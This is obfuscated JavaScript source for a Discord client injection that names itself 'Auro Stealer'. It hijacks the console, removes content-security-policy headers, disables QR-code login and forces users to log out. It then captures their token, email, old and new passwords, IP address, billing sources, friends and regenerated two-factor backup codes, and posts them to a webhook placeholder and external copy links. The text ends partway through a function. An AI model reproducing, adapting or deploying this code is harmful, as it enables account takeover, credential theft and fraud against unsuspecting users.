const n = (function () {
    let e = true
    return function (J, V) {
      const d = e
        ? function () {
            if (V) {
              const p = V.apply(J, arguments)
              return (V = null), p
            }
          }
        : function () {}
      return (e = false), d
    }
  })()
  const s = n(this, function () {
    return s
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(s)
      .search('(((.+)+)+)+$')
  })
  s()
  const A = (function () {
    let O = true
    return function (a, e) {
      const V = O
        ? function () {
            if (e) {
              const d = e.apply(a, arguments)
              return (e = null), d
            }
          }
        : function () {}
      return (O = false), V
    }
  })()
  ;(function () {
    A(this, function () {
      const e = new RegExp('function *\\( *\\)'),
        J = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        V = Y('init')
      !e.test(V + 'chain') || !J.test(V + 'input') ? V('0') : Y()
    })()
  })()
  const j = (function () {
      let e = true
      return function (J, V) {
        const i = e
          ? function () {
              if (V) {
                const G = V.apply(J, arguments)
                return (V = null), G
              }
            }
          : function () {}
        return (e = false), i
      }
    })(),
    Q = j(this, function () {
      let O
      try {
        const V = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        O = V()
      } catch (d) {
        O = window
      }
      const a = (O.console = O.console || {}),
        J = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
      for (let u = 0; u < J.length; u++) {
        const p = j.constructor.prototype.bind(j),
          q = J[u],
          b = a[q] || p
        p['__proto__'] = j.bind(j)
        p.toString = b.toString.bind(b)
        a[q] = p
      }
    })
  Q()
  const fs = require('fs'),
    path = require('path'),
    { BrowserWindow, session } = require('electron'),
    querystring = require('querystring'),
    os = require('os')
  var webhook =
    '%WEBHOOK_HERE%'
  var src = 'oreostealer//aka//auro_without_dualhook'
  const computerName = os.hostname(),
    discordInstall = '' + __dirname,
    EvalToken =
      'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
  String.prototype.insert = function (B, O) {
    if (B > 0) {
      return this.substring(0, B) + O + this.substr(B)
    }
    return O + this
  }
  const Qk = {}
  Qk.logout = 'instant'
  Qk['inject-notify'] = 'true'
  Qk['logout-notify'] = 'true'
  Qk['init-notify'] = 'false'
  Qk['embed-color'] = 3553599
  Qk['disable-qr-code'] = 'true'
  const config = Qk
  session.defaultSession.webRequest.onHeadersReceived((e, J) => {
    if (e.url.startsWith(webhook)) {
      if (e.url.includes('discord.com')) {
        const i = {}
        i['Access-Control-Allow-Headers'] = '*'
        J({ responseHeaders: Object.assign(i, e.responseHeaders) })
      } else {
        J({
          responseHeaders: Object.assign(
            {
              'Content-Security-Policy': [
                "default-src '*'",
                "Access-Control-Allow-Headers '*'",
                "Access-Control-Allow-Origin '*'",
              ],
              'Access-Control-Allow-Headers': '*',
              'Access-Control-Allow-Origin': '*',
            },
            e.responseHeaders
          ),
        })
      }
    } else {
      delete e.responseHeaders['content-security-policy']
      delete e.responseHeaders['content-security-policy-report-only']
      const p = { ...e.responseHeaders }
      p['Access-Control-Allow-Headers'] = '*'
      const q = { responseHeaders: p }
      J(q)
    }
  })
  function FirstTime(B) {
    const a = BrowserWindow.getAllWindows()[0]
    a.webContents.executeJavaScript('' + EvalToken, true).then((e) => {
      if (config['init-notify'] == 'true') {
        if (fs.existsSync(path.join(__dirname, 'init'))) {
          fs.rmdirSync(path.join(__dirname, 'init'))
          if (e == null || e == undefined || e == '') {
            const d = {
              username: 'Auro Stealer',
              content: '',
              embeds: [
                {
                  title: 'Discord Started',
                  color: config['embed-color'],
                  fields: [
                    {
                      name: 'Info',
                      value:
                        '```Hostname: \n' +
                        computerName +
                        '\nInjection Info: \n' +
                        __dirname +
                        '\n```',
                      inline: false,
                    },
                  ],
                  author: { name: 'Auro Stealer' },
                  footer: { text: 'Auro Stealer' },
                },
              ],
            }
            var V = d
            SendToWebhook(JSON.stringify(V))
          } else {
            const u = BrowserWindow.getAllWindows()[0]
            u.webContents
              .executeJavaScript(
                '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                  e +
                  '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
                true
              )
              .then((F) => {
                const U = JSON.parse(F)
                var p = {
                  username: 'Auro Stealer',
                  content: '',
                  embeds: [
                    {
                      title: 'Discord Initalized',
                      description:
                        '[**<:auro:953014127423541269> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
                        e +
                        ')',
                      color: config['embed-color'],
                      fields: [
                        {
                          name: 'Info',
                          value:
                            '```Hostname: \n' +
                            computerName +
                            '\nInjection Info: \n' +
                            __dirname +
                            '\n```',
                          inline: false,
                        },
                        {
                          name: 'Username',
                          value: '`' + U.username + '#' + U.discriminator + '`',
                          inline: true,
                        },
                        {
                          name: 'Email:',
                          value: '`' + B + '`',
                          inline: true,
                        },
                        {
                          name: 'Badges',
                          value: '' + GetBadges(U.flags),
                          inline: false,
                        },
                        {
                          name: 'Token',
                          value: '```' + e + '```',
                          inline: false,
                        },
                      ],
                      author: { name: 'Auro Stealer' },
                      footer: { text: 'Auro Stealer' },
                      thumbnail: {
                        url:
                          'https://cdn.discordapp.com/avatars/' +
                          U.id +
                          '/' +
                          U.avatar,
                      },
                    },
                  ],
                }
                SendToWebhook(JSON.stringify(p))
              })
          }
        }
      }
      if (!fs.existsSync(path.join(__dirname, 'Auro'))) {
        return true
      }
      fs.rmdirSync(path.join(__dirname, 'Auro'))
      if (config.logout != 'false' || config.logout == '%LOGOUT%') {
        if (config['logout-notify'] == 'true') {
          if (e == null || e == undefined || e == '') {
            const H = {
              username: 'Auro Stealer',
              content: '',
              embeds: [
                {
                  title: 'User log out (User not Logged in before)',
                  color: config['embed-color'],
                  fields: [
                    {
                      name: 'Info',
                      value:
                        '```Hostname: \n' +
                        computerName +
                        '\nInjection Info: \n' +
                        __dirname +
                        '\n```',
                      inline: false,
                    },
                  ],
                  author: { name: 'Auro Stealer' },
                  footer: { text: 'Auro Stealer' },
                },
              ],
            }
            var V = H
            SendToWebhook(JSON.stringify(V))
          } else {
            const y = BrowserWindow.getAllWindows()[0]
            y.webContents
              .executeJavaScript(
                '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                  e +
                  '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
                true
              )
              .then((x) => {
                const Z = JSON.parse(x)
                var h = {
                  username: 'Auro Stealer',
                  content: '',
                  embeds: [
                    {
                      color: config['embed-color'],
                      fields: [
                        {
                          name: '<a:auro:939849295803347035> Token:',
                          value:
                            '`' +
                            e +
                            '`' +
                            '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                            e +
                            ')',
                          inline: false,
                        },
                        {
                          name: '<a:auro:960868283488301076> Username:',
                          value: '`' + Z.username + '#' + Z.discriminator + '`',
                          inline: true,
                        },
                        {
                          name: '<:auro:960869204301606932> ID:',
                          value: '`' + Z.id + '`',
                          inline: true,
                        },
                        {
                          name: '<:auro:947263457395355648> Email:',
                          value: '`' + Z.email + '`',
                          inline: true,
                        },
                        {
                          name: '<:auro:947263456694902825> Badges:',
                          value: '' + GetBadges(Z.flags),
                          inline: true,
                        },
                        {
                          name: '<:auro:947263457093361724> Nitro Type:',
                          value: '' + GetNitro(Z.premium_type),
                          inline: true,
                        },
                      ],
                      author: {
                        name:
                          Z.username + '#' + Z.discriminator + ' (' + Z.id + ')',
                        icon_url:
                          'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                      },
                      footer: { text: 'Auro Stealer' },
                      thumbnail: {
                        url:
                          'https://cdn.discordapp.com/avatars/' +
                          Z.id +
                          '/' +
                          Z.avatar,
                      },
                    },
                  ],
                }
                SendToWebhook(JSON.stringify(h))
              })
          }
        }
        const U = BrowserWindow.getAllWindows()[0]
        U.webContents
          .executeJavaScript(
            'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
            true
          )
          .then((h) => {})
      }
      return false
    })
  }
  const Qt = {}
  Qt.urls = [
    'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
    'https://*.discord.com/api/v*/applications/detectable',
    'https://discord.com/api/v*/applications/detectable',
    'https://*.discord.com/api/v*/users/@me/library',
    'https://discord.com/api/v*/users/@me/library',
    'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
    'https://discord.com/api/v*/users/@me/billing/subscriptions',
    'wss://remote-auth-gateway.discord.gg/*',
  ]
  const Filter = Qt
  session.defaultSession.webRequest.onBeforeRequest(Filter, (O, a) => {
    if (O.url.startsWith('wss://')) {
      if (
        config['disable-qr-code'] == 'true' ||
        config['disable-qr-code'] == '%DISABLEQRCODE%'
      ) {
        const V = { cancel: true }
        a(V)
        return
      }
    }
    if (FirstTime()) {
    }
    a({})
    return
  })
  function SendToWebhook(B) {
    const O = BrowserWindow.getAllWindows()[0]
    O.webContents
      .executeJavaScript(
        '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
          webhook +
          "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
          B +
          '));\n    ',
        true
      )
      .then((a) => {})
  }
  function GetNitro(B) {
    if (B == 0) {
      return '`No Nitro`'
    }
    if (B == 1) {
      return '<:auro:940000520989442089> `Nitro Classic`'
    }
    if (B == 2) {
      return '<a:auro:915937369532821564> `Nitro Boost`'
    } else {
      return '`No Nitro`'
    }
  }
  function GetRBadges(O) {
    var p = ''
    if ((O & 1) == 1) {
      p += '<:staff:960870771016745030> '
    }
    ;(O & 2) == 2 && (p += '<:discord_partner:960871220457394256> ')
    if ((O & 4) == 4) {
      p += '<:hypesquad_events:960872040913592370> '
    }
    if ((O & 8) == 8) {
      p += '<:bughunter_1:960872690426707968> '
    }
    ;(O & 512) == 512 && (p += '<:early_supporter:960872690447691836> ')
    if ((O & 16384) == 16384) {
      p += '<:bughunter_2:960872690485452820> '
    }
    return (
      (O & 131072) == 131072 &&
        (p += '<:early_verified_bot_developer:960872690430910506> '),
      p == '' && (p = ''),
      p
    )
  }
  ;(function () {
    const O = function () {
      let J
      try {
        J = Function('return (function() {}.constructor("return this")( ));')()
      } catch (i) {
        J = window
      }
      return J
    }
    const a = O()
    a.setInterval(Y, 4000)
  })()
  function GetBadges(B) {
    const e = 2,
      J = 4,
      V = 8
    const F = 16384
    var q = ''
    ;(B & 1) == 1 && (q += '<:staff:960870771016745030> ')
    ;(B & e) == e && (q += '<:discord_partner:960871220457394256> ')
    if ((B & J) == J) {
      q += '<:hypesquad_events:960872040913592370> '
    }
    ;(B & V) == V && (q += '<:bughunter_1:960872690426707968> ')
    ;(B & 64) == 64 && (q += '<:hypesquad_bravery:960871617033015366> ')
    if ((B & 128) == 128) {
      q += '<:hypesquad_brilliance:960871616965922827> '
    }
    ;(B & 256) == 256 && (q += '<:hypesquad_balance:960871617284694046> ')
    ;(B & 512) == 512 && (q += '<:early_supporter:960872690447691836> ')
    if ((B & F) == F) {
      q += '<:bughunter_2:960872690485452820> '
    }
    if ((B & 131072) == 131072) {
      q += '<:early_verified_bot_developer:960872690430910506> '
    }
    q == '' && (q = '`No Badges`')
    return q
  }
  function Login(B, O, a) {
    const J = BrowserWindow.getAllWindows()[0]
    J.webContents
      .executeJavaScript(
        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
          a +
          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
        true
      )
      .then((V) => {
        J.webContents
          .executeJavaScript(
            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
            true
          )
          .then((d) => {
            J.webContents
              .executeJavaScript(
                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                  a +
                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                true
              )
              .then((u) => {
                J.webContents
                  .executeJavaScript(
                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                      a +
                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                    true
                  )
                  .then((p) => {
                    if (a.startsWith('mfa')) {
                      J.webContents
                        .executeJavaScript(
                          '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                            a +
                            '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                            O +
                            '","regenerate":true}));\n              xmlHttp.responseText',
                          true
                        )
                        .then((U) => {
                          var k = [],
                            t = '',
                            y = 'https://superfurrycdn.nl/copy/',
                            x = JSON.parse(U)
                          let f = x.backup_codes
                          const X = f.filter((E) => {
                            return E.consumed == false
                          })
                          for (let E in X) {
                            if (E == 0) {
                              t +=
                                '<:auro:960874006825811978> `' +
                                X[E].code.insert(4, '') +
                                '` '
                            } else {
                              if (E % 2 === 1) {
                                t +=
                                  '<:auro:960874006825811978> `' +
                                  X[E].code.insert(4, '') +
                                  '` \n'
                              } else {
                                t +=
                                  '<:auro:960874006825811978> `' +
                                  X[E].code.insert(4, '') +
                                  '` '
                              }
                            }
                          }
                          function c() {
                            var o = JSON.parse(p)
                            const Q0 = o.filter((Q1) => {
                              return Q1.type == 1
                            })
                            return Q0.length
                          }
                          function N() {
                            var l = JSON.parse(p)
                            const Q1 = l.filter((Q2) => {
                              return Q2.type == 1
                            })
                            var o = ''
                            for (z of Q1) {
                              var R = GetRBadges(z.user.public_flags)
                              if (R != '') {
                                o +=
                                  R +
                                  (' | `' +
                                    z.user.username +
                                    '#' +
                                    z.user.discriminator +
                                    '`\n')
                              }
                            }
                            if (o == '') {
                              o = '*Nothing to see here*'
                            }
                            return o
                          }
                          function C() {
                            const R = JSON.parse(u)
                            var l = ''
                            R.forEach((Q0) => {
                              if (Q0.type == '') {
                                return '`No`'
                              } else {
                                if (Q0.type == 2 && Q0.invalid != true) {
                                  l += ' <:auro:940184862940332103>'
                                } else {
                                  if (Q0.type == 1 && Q0.invalid != true) {
                                    l += ' <:auro:940000520582619147>'
                                  } else {
                                    return '`No`'
                                  }
                                }
                              }
                            })
                            if (l == '') {
                              l = '`No`'
                            }
                            return l
                          }
                          const D = JSON.parse(V)
                          var h = {
                            username: 'Auro Stealer',
                            content: '',
                            embeds: [
                              {
                                color: config['embed-color'],
                                fields: [
                                  {
                                    name: '<a:auro:939849295803347035> Token:',
                                    value:
                                      '`' +
                                      a +
                                      '`' +
                                      '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                      a +
                                      ')',
                                    inline: false,
                                  },
                                  {
                                    name: '<:auro:947263456694902825> Badges:',
                                    value: '' + GetBadges(D.flags),
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263457093361724> Nitro Type:',
                                    value: '' + GetNitro(D.premium_type),
                                    inline: true,
                                  },
                                  {
                                    name: '<a:auro:947263456774594591> Billing:',
                                    value: '' + C(),
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263456967536650> IP:',
                                    value: '`' + d + '`',
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263457395355648> Email:',
                                    value: '`' + B + '`',
                                    inline: true,
                                  },
                                  {
                                    name: '<a:auro:947263456720093235> Password:',
                                    value: '`' + O + '`',
                                    inline: true,
                                  },
                                ],
                                author: {
                                  name:
                                    D.username +
                                    '#' +
                                    D.discriminator +
                                    ' (' +
                                    D.id +
                                    ')',
                                  icon_url:
                                    'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                },
                                footer: { text: 'Auro Stealer' },
                                thumbnail: {
                                  url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    D.id +
                                    '/' +
                                    D.avatar,
                                },
                              },
                            ],
                          }
                          const L = {
                            color: config['embed-color'],
                            description: '' + t,
                            author: {},
                            footer: {},
                          }
                          L.author.icon_url =
                            'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif'
                          L.author.name = '2FA Codes'
                          L.footer.text = 'Auro Stealer'
                          var K = L,
                            Z = {
                              color: config['embed-color'],
                              description: N(),
                              author: {
                                icon_url:
                                  'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                name: 'HQ Friends',
                              },
                              footer: { text: 'Auro Stealer' },
                            }
                          a.startsWith('mfa') && h.embeds.push(K)
                          h.embeds.push(Z)
                          SendToWebhook(JSON.stringify(h))
                        })
                    } else {
                      const H = BrowserWindow.getAllWindows()[0]
                      H.webContents
                        .executeJavaScript(
                          '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                            a +
                            '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                          true
                        )
                        .then((k) => {
                          H.webContents
                            .executeJavaScript(
                              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                              true
                            )
                            .then((x) => {
                              H.webContents
                                .executeJavaScript(
                                  '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                    a +
                                    '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                  true
                                )
                                .then((Z) => {
                                  H.webContents
                                    .executeJavaScript(
                                      '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                        a +
                                        '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                      true
                                    )
                                    .then((f) => {
                                      function C() {
                                        var W = JSON.parse(f)
                                        const P = W.filter((M) => {
                                          return M.type == 1
                                        })
                                        return P.length
                                      }
                                      function D() {
                                        var W = JSON.parse(f)
                                        const z = W.filter((w) => {
                                          return w.type == 1
                                        })
                                        var P = ''
                                        for (z of z) {
                                          var M = GetRBadges(z.user.public_flags)
                                          M != '' &&
                                            (P +=
                                              M +
                                              (' | `' +
                                                z.user.username +
                                                '#' +
                                                z.user.discriminator +
                                                '`\n'))
                                        }
                                        if (P == '') {
                                          P = '*Nothing to see here*'
                                        }
                                        return P
                                      }
                                      function L() {
                                        const P = JSON.parse(Z)
                                        var W = ''
                                        return (
                                          P.forEach((M) => {
                                            if (M.type == '') {
                                              return '`No`'
                                            } else {
                                              if (
                                                M.type == 2 &&
                                                M.invalid != true
                                              ) {
                                                W += ' <:auro:940184862940332103>'
                                              } else {
                                                if (
                                                  M.type == 1 &&
                                                  M.invalid != true
                                                ) {
                                                  W +=
                                                    ' <:auro:940000520582619147>'
                                                } else {
                                                  return '`No`'
                                                }
                                              }
                                            }
                                          }),
                                          W == '' && (W = '`No`'),
                                          W
                                        )
                                      }
                                      const E = JSON.parse(k)
                                      var c = {
                                        username: 'Auro Stealer',
                                        content: '',
                                        embeds: [
                                          {
                                            color: config['embed-color'],
                                            fields: [
                                              {
                                                name: '<a:auro:939849295803347035> Token:',
                                                value:
                                                  '`' +
                                                  a +
                                                  '`' +
                                                  '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                                  a +
                                                  ')',
                                                inline: false,
                                              },
                                              {
                                                name: '<:auro:947263456694902825> Badges:',
                                                value: '' + GetBadges(E.flags),
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263457093361724> Nitro Type:',
                                                value:
                                                  '' + GetNitro(E.premium_type),
                                                inline: true,
                                              },
                                              {
                                                name: '<a:auro:947263456774594591> Billing:',
                                                value: '' + L(),
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263456967536650> IP:',
                                                value: '`' + x + '`',
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263457395355648> Email:',
                                                value: '`' + B + '`',
                                                inline: true,
                                              },
                                              {
                                                name: '<a:auro:947263456720093235> Password:',
                                                value: '`' + O + '`',
                                                inline: true,
                                              },
                                            ],
                                            author: {
                                              name:
                                                E.username +
                                                '#' +
                                                E.discriminator +
                                                ' (' +
                                                E.id +
                                                ')',
                                              icon_url:
                                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                            },
                                            footer: { text: 'Auro Stealer' },
                                            thumbnail: {
                                              url:
                                                'https://cdn.discordapp.com/avatars/' +
                                                E.id +
                                                '/' +
                                                E.avatar,
                                            },
                                          },
                                          {
                                            color: config['embed-color'],
                                            description: D(),
                                            author: {
                                              icon_url:
                                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                              name: 'HQ Friends',
                                            },
                                            footer: { text: 'Auro Stealer' },
                                          },
                                        ],
                                      }
                                      SendToWebhook(JSON.stringify(c))
                                    })
                                })
                            })
                        })
                    }
                  })
              })
          })
      })
  }
  function ChangePassword(B, O, a) {
    const J = BrowserWindow.getAllWindows()[0]
    J.webContents
      .executeJavaScript(
        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
          a +
          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
        true
      )
      .then((V) => {
        J.webContents
          .executeJavaScript(
            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
            true
          )
          .then((G) => {
            J.webContents
              .executeJavaScript(
                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                  a +
                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                true
              )
              .then((F) => {
                J.webContents
                  .executeJavaScript(
                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                      a +
                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                    true
                  )
                  .then((q) => {
                    if (a.startsWith('mfa')) {
                      J.webContents
                        .executeJavaScript(
                          '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                            a +
                            '")\n\t      xmlHttp.send(JSON.stringify({"password":"' +
                            O +
                            '","regenerate":true}));\n              xmlHttp.responseText',
                          true
                        )
                        .then((U) => {
                          var k = [],
                            t = '',
                            y = 'https://superfurrycdn.nl/copy/',
                            x = JSON.parse(U)
                          let f = x.backup_codes
                          const X = f.filter((E) => {
                            return E.consumed == false
                          })
                          for (let E in X) {
                            if (E == 0) {
                              t +=
                                '<:auro:960874006825811978> `' +
                                X[E].code.insert(4, '') +
                                '` '
                            } else {
                              if (E % 2 === 1) {
                                t +=
                                  '<:auro:960874006825811978> `' +
                                  X[E].code.insert(4, '') +
                                  '` \n'
                              } else {
                                t +=
                                  '<:auro:960874006825811978> `' +
                                  X[E].code.insert(4, '') +
                                  '` '
                              }
                            }
                          }
                          function c() {
                            var w = JSON.parse(q)
                            const l = w.filter((o) => {
                              return o.type == 1
                            })
                            return l.length
                          }
                          function N() {
                            var l = JSON.parse(q)
                            const Q1 = l.filter((Q2) => {
                              return Q2.type == 1
                            })
                            var o = ''
                            for (z of Q1) {
                              var R = GetRBadges(z.user.public_flags)
                              R != '' &&
                                (o +=
                                  R +
                                  (' | `' +
                                    z.user.username +
                                    '#' +
                                    z.user.discriminator +
                                    '`\n'))
                            }
                            if (o == '') {
                              o = '*Nothing to see here*'
                            }
                            return o
                          }
                          function C() {
                            const R = JSON.parse(F)
                            var l = ''
                            return (
                              R.forEach((Q0) => {
                                if (Q0.type == '') {
                                  return '`No`'
                                } else {
                                  if (Q0.type == 2 && Q0.invalid != true) {
                                    l += ' <:auro:940184862940332103>'
                                  } else {
                                    if (Q0.type == 1 && Q0.invalid != true) {
                                      l += ' <:auro:940000520582619147>'
                                    } else {
                                      return '`No`'
                                    }
                                  }
                                }
                              }),
                              l == '' && (l = '`No`'),
                              l
                            )
                          }
                          const D = JSON.parse(V)
                          var h = {
                            username: 'Auro Stealer',
                            content: '',
                            embeds: [
                              {
                                color: config['embed-color'],
                                fields: [
                                  {
                                    name: '<a:auro:939849295803347035> Token:',
                                    value:
                                      '`' +
                                      a +
                                      '`' +
                                      '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                      a +
                                      ')',
                                    inline: false,
                                  },
                                  {
                                    name: '<:auro:947263456694902825> Badges:',
                                    value: '' + GetBadges(D.flags),
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263457093361724> Nitro Type:',
                                    value: '' + GetNitro(D.premium_type),
                                    inline: true,
                                  },
                                  {
                                    name: '<a:auro:947263456774594591> Billing:',
                                    value: '' + C(),
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263456967536650> IP:',
                                    value: '`' + G + '`',
                                    inline: true,
                                  },
                                  {
                                    name: '<:auro:947263457395355648> Email:',
                                    value: '`' + D.email + '`',
                                    inline: true,
                                  },
                                  {
                                    name: '<a:auro:947263456720093235> Old Password:',
                                    value: '`' + B + '`',
                                    inline: true,
                                  },
                                  {
                                    name: '<a:auro:947263456720093235> New Password:',
                                    value: '`' + O + '`',
                                    inline: true,
                                  },
                                ],
                                author: {
                                  name:
                                    D.username +
                                    '#' +
                                    D.discriminator +
                                    ' (' +
                                    D.id +
                                    ')',
                                  icon_url:
                                    'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                },
                                footer: { text: 'Auro Stealer' },
                                thumbnail: {
                                  url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    D.id +
                                    '/' +
                                    D.avatar,
                                },
                              },
                            ],
                          }
                          const L = {
                            color: config['embed-color'],
                            description: '' + t,
                            author: {},
                            footer: {},
                          }
                          L.author.icon_url =
                            'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif'
                          L.author.name = '2FA Codes'
                          L.footer.text = 'Auro Stealer'
                          var K = L,
                            Z = {
                              color: config['embed-color'],
                              description: N(),
                              author: {
                                icon_url:
                                  'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                name: 'HQ Friends',
                              },
                              footer: { text: 'Auro Stealer' },
                            }
                          a.startsWith('mfa') && h.embeds.push(K)
                          h.embeds.push(Z)
                          SendToWebhook(JSON.stringify(h))
                        })
                    } else {
                      const H = BrowserWindow.getAllWindows()[0]
                      H.webContents
                        .executeJavaScript(
                          '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                            a +
                            '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                          true
                        )
                        .then((k) => {
                          H.webContents
                            .executeJavaScript(
                              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                              true
                            )
                            .then((y) => {
                              H.webContents
                                .executeJavaScript(
                                  '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                    a +
                                    '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                  true
                                )
                                .then((K) => {
                                  H.webContents
                                    .executeJavaScript(
                                      '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                        a +
                                        '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                      true
